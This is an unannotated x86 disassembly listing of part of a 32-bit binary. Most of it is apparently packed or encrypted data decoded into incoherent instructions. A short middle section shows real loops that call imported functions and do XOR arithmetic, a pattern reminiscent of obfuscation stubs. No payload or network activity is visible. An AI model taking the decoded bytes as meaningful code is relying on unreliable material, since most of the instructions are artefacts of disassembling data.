  40aa33:	mov    al,ds:0xc18ac98a
  40aa38:	loope  0x40a9dc
  40aa3a:	xlat   BYTE PTR ds:[ebx]
  40aa3b:	xor    eax,0x89a48de8
  40aa40:	popf   
  40aa41:	pop    eax
  40aa42:	and    al,0x1
  40aa44:	out    dx,al
  40aa45:	lahf   
  40aa46:	retf   
  40aa47:	xchg   BYTE PTR [ecx+0x72],bh
  40aa4a:	icebp  
  40aa4b:	ins    DWORD PTR es:[edi],dx
  40aa4c:	in     eax,0x81
  40aa4e:	stc    
  40aa4f:	dec    ebx
  40aa50:	ret    
  40aa51:	gs push ebx
  40aa53:	pop    edi
  40aa54:	vpandn ymm4,ymm3,YMMWORD PTR [ecx]
  40aa58:	or     eax,0x5cf00130
  40aa5d:	pop    esp
  40aa5e:	xchg   esi,eax
  40aa5f:	je     0x40aa7d
  40aa61:	std    
  40aa62:	cmp    BYTE PTR [eax],ah
  40aa64:	pop    eax
  40aa65:	add    ebp,esi
  40aa67:	mov    ebp,0xf9605924
  40aa6c:	cbw    
  40aa6e:	lahf   
  40aa6f:	hlt    
  40aa70:	psrlw  mm7,QWORD PTR [eax-0x65c59e1]
  40aa77:	icebp  
  40aa78:	pop    ds
  40aa79:	add    al,BYTE PTR [eax+0x78]
  40aa7c:	in     eax,0x76
  40aa7e:	sub    BYTE PTR [edx-0x45],dh
  40aa81:	sbb    bh,BYTE PTR [ecx]
  40aa83:	call   0xebca32ec
  40aa88:	and    al,0x4a
  40aa8a:	mov    ebp,0x12d2df06
  40aa8f:	mov    al,0x63
  40aa91:	cmp    DWORD PTR [ecx+0x4e],eax
  40aa94:	jo     0x40aac4
  40aa96:	mov    edx,0xbbfe9c01
  40aa9b:	mov    BYTE PTR [eax],ah
  40aa9d:	pushw  ss
  40aa9f:	imul   ebp,DWORD PTR [edx],0x8
  40aaa2:	lock cld 
  40aaa4:	or     DWORD PTR [edi-0x64],esp
  40aaa7:	icebp  
  40aaa8:	dec    edx
  40aaa9:	xlat   BYTE PTR ds:[ebx]
  40aaaa:	sub    ebp,DWORD PTR [ebp+0x357bfa7]
  40aab0:	push   ss
  40aab1:	xor    eax,0x4daa07de
  40aab6:	and    ebp,DWORD PTR [ecx]
  40aab8:	lods   al,BYTE PTR ds:[esi]
  40aab9:	sbb    esi,DWORD PTR [edi-0x56]
  40aabc:	inc    esp
  40aabd:	frstor [eax]
  40aabf:	repnz cmp ch,BYTE PTR [edi]
  40aac2:	jnp    0x40aaa3
  40aac4:	pushf  
  40aac5:	cld    
  40aac6:	dec    ecx
  40aac7:	fldcw  WORD PTR [ebx+0x4318f199]
  40aacd:	data16 fcom QWORD PTR [edx]
  40aad0:	dec    edx
  40aad1:	vminps xmm1,xmm6,XMMWORD PTR [ebp+edi*2+0x5af80e0c]
  40aada:	adc    DWORD PTR [eax+0x502a5e23],ecx
  40aae0:	and    BYTE PTR [edx],dh
  40aae2:	out    0xa0,al
  40aae4:	ret    
  40aae5:	xor    DWORD PTR [ebp+0x5724cf16],0x7a
  40aaec:	sub    BYTE PTR [edx+0x3e32b7d8],ah
  40aaf2:	leave  
  40aaf3:	cmp    BYTE PTR [esi+0x47],al
  40aaf6:	jb     0x40aa98
  40aaf8:	xchg   BYTE PTR [edi+0x2225de51],ch
  40aafe:	leave  
  40aaff:	pop    esi
  40ab00:	push   esi
  40ab01:	fwait
  40ab02:	push   ebx
  40ab03:	dec    esp
  40ab04:	pop    ecx
  40ab05:	add    edi,DWORD PTR [ecx+0x5f]
  40ab08:	push   es
  40ab09:	fstp   DWORD PTR [ebp+ecx*1-0x53d12d0b]
  40ab10:	xor    DWORD PTR cs:[edi],ebp
  40ab13:	dec    esp
  40ab14:	jne    0x40aafd
  40ab16:	xchg   DWORD PTR [eax],esp
  40ab18:	hlt    
  40ab19:	test   dl,ah
  40ab1b:	test   eax,0x70c95e75
  40ab20:	pusha  
  40ab21:	popf   
  40ab22:	mov    ebp,0x1362055d
  40ab27:	les    esi,FWORD PTR ds:0xcbac74fb
  40ab2d:	out    0xf0,al
  40ab2f:	aas    
  40ab30:	mov    ds:0xbb9cc199,al
  40ab35:	and    esi,DWORD PTR [eax]
  40ab37:	inc    esi
  40ab38:	jge    0x40ab91
  40ab3a:	add    al,0x8c
  40ab3c:	sub    eax,DWORD PTR [ebx]
  40ab3e:	shr    dh,cl
  40ab40:	xchg   ecx,eax
  40ab41:	shr    bl,cl
  40ab43:	bnd jge 0x40ab7c
  40ab46:	mov    BYTE PTR [eax-0x43f9e2d4],ch
  40ab4c:	add    al,0xd5
  40ab4e:	jge    0x40ab8f
  40ab50:	nop
  40ab51:	jno    0x40aaf0
  40ab53:	adc    DWORD PTR [edi-0x45],esp
  40ab56:	jge    0x40ab59
  40ab58:	imul   edi,DWORD PTR [ebx],0x1f
  40ab5b:	pop    eax
  40ab5c:	ins    BYTE PTR es:[edi],dx
  40ab5d:	push   cx
  40ab5f:	or     DWORD PTR [eax+0x3539976d],eax
  40ab65:	mov    dh,0x51
  40ab67:	mov    cl,0xea
  40ab69:	addr16 jae 0x40abbd
  40ab6c:	mov    eax,ds:0x232e50d8
  40ab71:	add    al,0x2a
  40ab73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab74:	cmp    DWORD PTR [edi+0x29c7732d],ecx
  40ab7a:	mov    al,0x42
  40ab7c:	adc    esp,DWORD PTR [ebp+0x2ff19b28]
  40ab82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab83:	xchg   BYTE PTR [edx],dl
  40ab85:	arpl   WORD PTR [esi],bp
  40ab87:	aaa    
  40ab88:	adc    eax,0x45c12fa8
  40ab8d:	mov    cl,0x3b
  40ab8f:	ja     0x40abbe
  40ab91:	sub    dh,BYTE PTR [ecx*8+0x1b0c52a2]
  40ab98:	or     DWORD PTR cs:[edi],eax
  40ab9b:	dec    edi
  40ab9c:	and    bl,ch
  40ab9e:	mov    esi,0x66f627f9
  40aba3:	cmp    eax,0x42db8644
  40aba8:	pushf  
  40aba9:	ret    0x91e9
  40abac:	(bad)  
  40abae:	(bad)  
  40abaf:	retf   0x6b86
  40abb2:	fstp   DWORD PTR ds:0xe3d0697e
  40abb8:	rcr    DWORD PTR [ebx+0x3a],cl
  40abbb:	(bad)  
  40abbc:	cli    
  40abbd:	lea    esi,[ebp-0x2f]
  40abc0:	(bad)  
  40abc2:	push   esi
  40abc3:	mov    cl,0x91
  40abc5:	call   0xe6ee9063
  40abca:	mov    BYTE PTR fs:0xc869f8de,bh
  40abd1:	mov    ebx,0xe120503f
  40abd6:	dec    eax
  40abd7:	pop    es
  40abd8:	(bad)
  40abdb:	mov    esi,0xa33aa356
  40abe0:	xchg   edx,eax
  40abe1:	popf   
  40abe2:	pop    esi
  40abe3:	in     eax,dx
  40abe4:	xlat   BYTE PTR ds:[ebx]
  40abe5:	test   DWORD PTR ds:0x11bd4842,esi
  40abeb:	mov    ebp,ss
  40abed:	les    eax,FWORD PTR [esi-0x4e]
  40abf0:	test   DWORD PTR [ebp+0x7ee22530],esp
  40abf6:	or     BYTE PTR [ebp+0x53],ch
  40abf9:	icebp  
  40abfa:	push   ss
  40abfb:	fnsave [ebx+0x3310c081]
  40ac01:	rol    BYTE PTR [ecx+0x42fc7535],1
  40ac07:	add    BYTE PTR [edi+0x30042e6],cl
  40ac0d:	rol    edi,1
  40ac0f:	add    eax,0x42e683
  40ac14:	fwait
  40ac15:	sbb    BYTE PTR [eax],al
  40ac17:	add    BYTE PTR [ebx],bh
  40ac19:	cli    
  40ac1a:	mov    DWORD PTR ds:0x42fc5d,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fcfe,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fc75,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e677,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e677,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e677,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e1bd
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e273
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e677
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e677,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e0a8,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e0a8
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e0a8,ebx
  40acad:	cmp    DWORD PTR ds:0x42e0a8,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e0a8,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e277
  40acd5:	cmp    DWORD PTR ds:0x42e0a8,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e0a8
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e0a8,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e0b4
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fc61,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fc61,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fc61,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fc81
  40ad3c:	call   DWORD PTR ds:0x42e4cb
  40ad42:	mov    ebx,DWORD PTR ds:0x42fc61
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fc61,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40adea
  40adb4:	cmc    
  40adb5:	in     eax,dx
  40adb6:	jecxz  0x40adbb
  40adb8:	std    
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ad86
  40adc0:	inc    ebp
  40adc1:	aaa    
  40adc2:	xchg   edi,eax
  40adc3:	xchg   esi,eax
  40adc4:	je     0x40adaf
  40adc6:	jmp    0xbe900f3e
  40adcb:	and    esi,edi
  40adcd:	adc    ch,bh
  40adcf:	aaa    
  40add0:	mov    ecx,0x58f16ecd
  40add5:	xor    al,0xe1
  40add7:	dec    esp
  40add8:	das    
  40add9:	popf   
  40adda:	cmp    ch,BYTE PTR [ebx]
  40addc:	fwait
  40addd:	cmc    
  40adde:	gs aaa 
  40ade0:	mov    cl,0xe4
  40ade2:	mov    ebp,DWORD PTR ds:0xf3b8937b
  40ade8:	and    dl,BYTE PTR [ecx-0x61]
  40adeb:	fst    st(1)
  40aded:	push   ds
  40adee:	int    0xb9
  40adf0:	fnstenv [ecx-0x54]
  40adf3:	pop    ebx
  40adf4:	call   0xda657d0c
  40adf9:	xor    eax,0xb101f028
  40adfe:	add    esp,DWORD PTR [ebx-0x59]
  40ae01:	out    dx,eax
  40ae02:	dec    eax
  40ae03:	jae    0x40ad93
  40ae05:	imul   eax,ebp,0xffffffe0
  40ae08:	hlt    
  40ae09:	mov    ds:0x56a26702,eax
  40ae0e:	sbb    esi,DWORD PTR [ecx]
  40ae10:	iret   
  40ae11:	shl    BYTE PTR ds:0x1617eba8,1
  40ae17:	adc    DWORD PTR [edi+0x2e6a4299],edi
  40ae1d:	dec    edi
  40ae1e:	jge    0x40ae70
  40ae20:	dec    esi
  40ae21:	inc    ecx
  40ae22:	outs   dx,DWORD PTR ds:[esi]
  40ae23:	mov    ?,WORD PTR [eax+esi*8]
  40ae26:	jae    0x40ae31
  40ae28:	out    0xf1,al
  40ae2a:	fiadd  DWORD PTR [edi]
  40ae2c:	repnz shl DWORD PTR [esi+0x50],cl
  40ae30:	es mov esp,0x3da7ced5
  40ae36:	outs   dx,BYTE PTR ds:[esi]
  40ae37:	and    al,0x74
  40ae39:	push   ss
  40ae3a:	rcl    BYTE PTR [esi+0x4cc0df44],cl
  40ae40:	into   
  40ae41:	mov    bl,0x5d
  40ae43:	jmp    0xbe20c3a2
  40ae48:	enter  0x23f5,0x1a
  40ae4c:	pushf  
  40ae4d:	aas    
  40ae4e:	jno    0x40aebb
  40ae50:	adc    BYTE PTR [edi],dh
  40ae52:	aas    
  40ae53:	test   BYTE PTR [esp+ebp*8-0x44],cl
  40ae57:	loop   0x40ae34
  40ae59:	bound  edx,QWORD PTR [ebx]
  40ae5b:	cmp    ch,al
  40ae5d:	jge    0x40ae1c
  40ae5f:	add    DWORD PTR [ecx+0x30],eax
  40ae62:	or     DWORD PTR [eax+0x5eb91514],ebp
  40ae68:	jl     0x40ae60
  40ae6a:	pop    ss
  40ae6b:	in     al,dx
  40ae6c:	retf   0xa8d9
  40ae6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae70:	cmp    cl,BYTE PTR [edx*8-0x404ac1e9]
  40ae77:	push   ebp
  40ae78:	sub    BYTE PTR [eax-0x75],al
  40ae7b:	lods   al,BYTE PTR ds:[esi]
  40ae7c:	mov    edx,0x24bb7646
  40ae81:	fsin   
  40ae83:	jnp    0x40ae30
  40ae85:	fidivr WORD PTR [eax+0x2c57c3d8]
  40ae8b:	cs inc ebp
  40ae8d:	addr16 mov esp,0x730e5390
  40ae93:	or     cl,BYTE PTR [esi-0x8482d9a]
  40ae99:	xchg   esp,eax
  40ae9a:	pop    ebx
  40ae9b:	push   ebx
  40ae9c:	ror    BYTE PTR [edx+0x75ff9ab8],0x5c
  40aea3:	adc    DWORD PTR [edi],esp
  40aea5:	mov    ah,0xb6
  40aea7:	pop    DWORD PTR [edx]
  40aea9:	stos   DWORD PTR es:[edi],eax
  40aeaa:	push   ebx
  40aeab:	sub    bl,BYTE PTR [ebx]
  40aead:	sahf   
  40aeae:	xchg   esi,eax
  40aeaf:	push   eax
  40aeb0:	inc    ecx
  40aeb1:	ins    BYTE PTR es:[edi],dx
  40aeb2:	jmp    0x2f05ee18
  40aeb7:	pop    ebx
  40aeb8:	lahf   
  40aeb9:	fstp   DWORD PTR [edx+esi*1-0x4b]
  40aebd:	jmp    0x3f7b:0x9715346d
  40aec4:	pop    esi
  40aec5:	inc    ecx
  40aec6:	jbe    0x40af11
  40aec8:	pop    edx
  40aec9:	test   DWORD PTR [ebp+0x58],0xafb7f8ef
  40aed0:	lods   al,BYTE PTR ds:[esi]
  40aed1:	fld1   
  40aed3:	and    esi,DWORD PTR [eax]
  40aed5:	mov    bl,0xa2
  40aed7:	adc    dh,BYTE PTR [esi+0x18]
  40aeda:	mov    es,WORD PTR ds:0x39bdcf7
  40aee0:	mov    ds:0x3a19ddc3,eax
  40aee5:	jp     0x40ae93
  40aee7:	into   
  40aee8:	jle    0x40aea7
  40aeea:	imul   esi,DWORD PTR [edi],0x48
  40aeed:	sub    BYTE PTR [eax-0x7b2eecbc],al
  40aef3:	xor    eax,DWORD PTR [eax+0x4e]
  40aef6:	add    edi,DWORD PTR [eax+0x6b268737]
  40aefc:	sub    eax,0x7d821a04
  40af01:	sub    DWORD PTR [esi],0x5c198615
  40af07:	dec    ecx
  40af08:	and    al,0xdc
  40af0a:	call   0xfae172a1
  40af0f:	out    0xb,al
  40af11:	call   0xfd5a:0xbb80b1ec
  40af18:	jbe    0x40af83
  40af1a:	pop    esi
  40af1b:	test   BYTE PTR [esi+edx*8],al
  40af1e:	pop    ecx
  40af1f:	and    eax,0xb675c610
  40af24:	adc    DWORD PTR [ecx-0x401845f7],edx
  40af2a:	dec    ebp
  40af2b:	mov    esi,0xea63b622
  40af30:	mov    esi,cr0
  40af33:	and    al,0xc9
  40af35:	cdq    
  40af36:	adc    BYTE PTR [esi-0x5c36e7f7],ah
  40af3c:	xchg   edi,eax
  40af3d:	fs out dx,eax
  40af3f:	ds mov bl,0xd1
  40af42:	sub    cl,BYTE PTR [eax+ebp*2+0x69]
  40af46:	jle    0x40af44
  40af48:	in     eax,dx
  40af49:	or     al,0x4c
  40af4b:	mov    dh,0x2
  40af4d:	xchg   esi,eax
  40af4e:	popf   
  40af4f:	popf   
  40af50:	push   esp
  40af51:	stos   BYTE PTR es:[edi],al
  40af52:	in     eax,dx
  40af53:	pop    ebp
  40af54:	sbb    dl,BYTE PTR [ecx]
  40af56:	push   ecx
  40af57:	mov    esi,0xf081ea8e
  40af5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af5d:	hlt    
  40af5e:	dec    esp
  40af5f:	pop    es
  40af60:	test   BYTE PTR [eax],bh
  40af62:	sahf   
  40af63:	test   BYTE PTR [ebx],0x2f
  40af66:	loopne 0x40afc8
  40af68:	(bad)  
  40af69:	aad    0x9e
  40af6b:	inc    ecx
  40af6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af6d:	pop    ecx
  40af6e:	cld    
  40af6f:	mov    edx,0xfcf528d8
  40af74:	es pop ds
  40af76:	xor    eax,0x86a5d42e
  40af7b:	jne    0x40af5d
  40af7d:	and    DWORD PTR [edx],0xc09ab575
  40af83:	stos   BYTE PTR es:[edi],al
  40af84:	stc    
  40af85:	inc    edx
  40af86:	sub    BYTE PTR ds:0x5ea141d3,0x1d
  40af8d:	xchg   ebp,eax
  40af8e:	fistp  WORD PTR [edi]
  40af90:	aaa    
  40af91:	stos   BYTE PTR es:[edi],al
  40af92:	jmp    0x40afc9
  40af94:	and    DWORD PTR [eax-0x63],esp
  40af97:	xchg   ebp,eax
  40af98:	cli    
  40af99:	lods   al,BYTE PTR ds:[esi]
  40af9a:	push   ecx
  40af9b:	in     eax,0x8c
  40af9d:	or     eax,esp
  40af9f:	outs   dx,DWORD PTR ds:[esi]
  40afa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afa1:	add    ch,BYTE PTR [ecx-0x60]
  40afa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afa5:	sub    al,0xd2
  40afa7:	into   
  40afa8:	repz aas 
  40afaa:	or     al,0x6c
  40afac:	stos   WORD PTR es:[edi],ax
  40afae:	cli    
  40afaf:	jne    0x40b010
  40afb1:	cmp    esi,DWORD PTR ss:[eax+0x36]
  40afb5:	mov    ecx,0x70121f95
  40afba:	shl    DWORD PTR [ebp+edi*4-0x48],0xab
  40afbf:	sti    
  40afc0:	(bad)  
  40afc1:	aas    
  40afc2:	or     al,0x17
  40afc4:	pop    ss
  40afc5:	fsubr  DWORD PTR [esi]
  40afc7:	out    0xa1,al
  40afc9:	iret   
  40afca:	mov    ds:0xebf3aeb4,eax
  40afcf:	cld    
  40afd0:	icebp  
  40afd1:	jnp    0x40afd1
  40afd3:	nop
  40afd4:	mov    eax,DWORD PTR [edx]
  40afd6:	ret    0xc95f
  40afd9:	out    0x9,eax
  40afdb:	(bad)  [ecx-0x22748e57]
  40afe1:	sbb    dl,dl
  40afe3:	test   eax,0x65ae6895
  40afe8:	outs   dx,BYTE PTR ds:[esi]
  40afe9:	ins    BYTE PTR es:[edi],dx
  40afea:	push   es
  40afeb:	inc    eax
  40afec:	sbb    esp,DWORD PTR [ecx-0x11354636]
  40aff2:	into   
  40aff3:	pop    ebp
  40aff4:	adc    DWORD PTR [edx],edi
  40aff6:	mov    esp,0x893892da
  40affb:	xchg   edi,eax
  40affc:	pop    es
  40affd:	inc    esi
  40affe:	mov    edx,0x6c0621e5
  40b003:	mov    DWORD PTR ds:0xb6244ab7,ebp
  40b009:	mov    bl,dl
  40b00b:	std    
  40b00c:	bound  ebx,QWORD PTR [ecx+0x2d87fc5c]
  40b012:	adc    eax,0xbe8f5480
  40b017:	inc    edi
  40b018:	cmp    edi,edi
  40b01a:	call   0xdeaaf2bf
  40b01f:	ds dec edx
  40b021:	test   al,0xf1
  40b023:	add    al,0x3b
  40b025:	push   esi
  40b026:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40b028:	sti    
  40b029:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b02a:	inc    esp
  40b02b:	fcomi  st,st(0)
  40b02d:	push   0xffffff9d
  40b02f:	retf   0xd3f
  40b032:	scas   al,BYTE PTR es:[edi]
  40b033:	lahf   
  40b034:	stos   DWORD PTR es:[edi],eax
  40b035:	ss xchg esi,eax
  40b037:	push   ebx
  40b038:	dec    eax
  40b039:	jne    0x40b030
  40b03b:	cwde   
  40b03c:	jb     0x40afd8
  40b03e:	add    DWORD PTR [ebx+0x311e3f7c],ecx
  40b044:	cmova  esp,DWORD PTR [edx-0x54]
  40b048:	pop    esp
  40b049:	push   ecx
  40b04a:	xchg   ebp,eax
  40b04b:	cmp    al,0x99
  40b04d:	aad    0x57
  40b04f:	and    edx,DWORD PTR [ebx-0xe]
  40b052:	dec    eax
  40b053:	and    esi,ecx
  40b055:	add    al,0xec
  40b057:	push   ebp
  40b058:	jb     0x40b043
  40b05a:	fbld   TBYTE PTR [edi-0x7e753d2a]
  40b060:	pusha  
  40b061:	pop    esp
  40b062:	push   eax
  40b063:	repnz les esp,FWORD PTR [eax]
  40b066:	push   ebx
  40b067:	lock xchg ebx,eax
  40b069:	xchg   BYTE PTR [esi-0x634975de],al
  40b06f:	mov    eax,DWORD PTR [ecx]
  40b071:	dec    edi
  40b072:	mov    bl,0x93
  40b074:	in     al,0x3a
  40b076:	xchg   DWORD PTR [ebx],edi
  40b078:	dec    eax
  40b079:	xlat   BYTE PTR ds:[ebx]
  40b07a:	fisttp DWORD PTR [eax-0x7216a039]
  40b080:	cmp    ebx,DWORD PTR [ebx+0x8813831]
  40b086:	pusha  
  40b087:	jmp    0x448:0x970f6ba9
  40b08e:	mov    ds:0x7756d4fc,al
  40b093:	cmc    
  40b094:	jae    0x40b107
  40b096:	mov    al,ds:0xa5cd67b2
  40b09b:	add    al,0x43
  40b09d:	sub    BYTE PTR [ebx],ch
  40b09f:	adc    cl,BYTE PTR [eax+esi*1+0x5e]
  40b0a3:	ret    
  40b0a4:	mov    dl,0xa4
  40b0a6:	hlt    
  40b0a7:	aad    0xd6
  40b0a9:	xchg   esi,eax
  40b0aa:	sbb    DWORD PTR [esi],ecx
  40b0ac:	cmc    
  40b0ad:	ret    0x1043
  40b0b0:	xchg   esi,eax
  40b0b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0b2:	and    al,0x1c
  40b0b4:	aad    0x59
  40b0b6:	dec    eax
  40b0b7:	mov    ebx,0x1fd9fb3a
  40b0bc:	add    DWORD PTR [ecx+0x2],eax
  40b0bf:	and    edi,DWORD PTR [eax]
  40b0c1:	iret   
  40b0c2:	js     0x40b059
  40b0c4:	pop    ds
  40b0c5:	jns    0x40b0c8
  40b0c7:	inc    ebx
  40b0c8:	ficom  WORD PTR [ebp+ebp*4-0x7b]
  40b0cc:	mov    al,0xb0
  40b0ce:	inc    edi
  40b0cf:	add    DWORD PTR [ecx],ebx
  40b0d1:	mov    al,ds:0x573dc02d
  40b0d6:	fs mov esi,0xa8e16333
  40b0dc:	data16 jne 0x40b09f
  40b0df:	cmp    al,0x1c
  40b0e1:	dec    ebp
  40b0e2:	fild   QWORD PTR [edx+0x1654d7ce]
  40b0e8:	imul   ecx,DWORD PTR [esi-0x1d],0x50
  40b0ec:	push   ebx
  40b0ed:	enter  0xf5d,0xbf
  40b0f1:	jmp    0xd1bf:0x29c50ff9
  40b0f8:	es adc ebp,0xfffffffd
  40b0fc:	in     al,0x45
  40b0fe:	les    eax,FWORD PTR [eax]
  40b100:	fs mov ebp,0x3f363945
  40b106:	xor    bl,cl
  40b108:	or     edx,DWORD PTR [ebp+0x46ded8b0]
  40b10e:	xor    eax,0xfc90806a
  40b113:	es stc 
  40b115:	sbb    DWORD PTR [edi+0x5e],ebx
  40b118:	sub    ch,BYTE PTR [ecx]
  40b11a:	xchg   esi,eax
  40b11b:	push   edx
  40b11c:	inc    esi
  40b11d:	call   0x5d5f:0x6a7dd75d
  40b124:	or     eax,0x71d9ba4e
  40b129:	add    eax,0x7c302172
  40b12e:	cdq    
  40b12f:	ds push eax
  40b131:	repz adc DWORD PTR [edi],ecx
  40b134:	xchg   DWORD PTR [ecx],ebx
  40b136:	or     DWORD PTR [ebp-0x4c],0xd1c7f213
  40b13d:	nop
  40b13e:	push   esi
  40b13f:	mov    edi,0xb6616ad2
  40b144:	jg     0x40b110
  40b146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b147:	popf   
  40b148:	retf   0xc941
  40b14b:	mov    ebp,DWORD PTR [edi+esi*8+0x4ec709bb]
  40b152:	sub    ebp,0xffffffff
  40b155:	and    ah,BYTE PTR [esp+ebp*1-0x40a82432]
  40b15c:	cmp    al,ah
  40b15e:	ds mov dl,0x3
  40b161:	shr    ecx,1
  40b163:	mov    ecx,0xd2000003
  40b168:	jne    0x40b1a1
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	jns    0x40b1b9
  40b175:	repz mov cs:0x9f7070fa,al
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b151
  40b180:	or     eax,0xc20a0190
  40b185:	adc    ebp,DWORD PTR ds:0xc5d306ff
  40b18b:	jno    0x40b1ff
  40b18d:	mov    ds:0xb1567793,eax
  40b192:	ins    DWORD PTR es:[edi],dx
  40b193:	add    eax,0x6451ed7
  40b198:	popf   
  40b199:	add    eax,0x4d69c994
  40b19e:	enter  0x2910,0x24
  40b1a2:	xlat   BYTE PTR ds:[ebx]
  40b1a3:	mov    bh,BYTE PTR ds:0xe1c650e6
  40b1a9:	push   ss
  40b1aa:	aam    0x1e
  40b1ac:	je     0x40b1fe
  40b1ae:	cmc    
  40b1af:	gs xchg esp,eax
  40b1b1:	enter  0x41ec,0xa1
  40b1b5:	push   ebx
  40b1b6:	pop    edx
  40b1b7:	cmp    ch,bh
  40b1b9:	imul   ebp,esp,0x704bee79
  40b1bf:	lods   al,BYTE PTR ds:[esi]
  40b1c0:	fnstsw WORD PTR [ebx+0x51b108a2]
  40b1c6:	mov    DWORD PTR [edi+0xd92717b],ecx
  40b1cc:	inc    edx
  40b1cd:	push   DWORD PTR [ebx]
  40b1cf:	icebp  
  40b1d0:	fcom   QWORD PTR [ecx+0x33]
  40b1d3:	out    0x83,al
  40b1d5:	sahf   
  40b1d6:	and    BYTE PTR [esi+0x364558c7],ah
  40b1dc:	fsubr  QWORD PTR [edx-0x335bfdf7]
  40b1e2:	les    eax,FWORD PTR [ecx+0x27]
  40b1e5:	dec    edi
  40b1e6:	jbe    0x40b1e0
  40b1e8:	xor    esi,edi
  40b1ea:	ror    DWORD PTR [ebx+0x20],cl
  40b1ed:	jnp    0x40b1d3
  40b1ef:	lahf   
  40b1f0:	inc    ebp
  40b1f1:	cwde   
  40b1f2:	inc    esp
  40b1f3:	add    eax,0x61ecf10
  40b1f8:	out    0x27,eax
  40b1fa:	dec    edx
  40b1fb:	lods   eax,DWORD PTR ds:[esi]
  40b1fc:	inc    esp
  40b1fd:	imul   eax,edx,0x391ebd67
  40b203:	add    edx,ebx
  40b205:	popa   
  40b206:	jb     0x40b261
  40b208:	jb     0x40b1b1
  40b20a:	sbb    DWORD PTR [esi+0x70],0xffffffac
  40b20e:	leave  
  40b20f:	lock sti 
  40b211:	pop    edi
  40b212:	jmp    edx
  40b214:	xchg   edi,eax
  40b215:	loop   0x40b230
  40b217:	mov    cl,0x69
  40b219:	in     al,0xac
  40b21b:	pusha  
  40b21c:	stos   DWORD PTR es:[edi],eax
  40b21d:	jmp    DWORD PTR [eax-0x7c9dde17]
  40b223:	mov    es:0xe80f5d8c,al
  40b229:	add    bl,ch
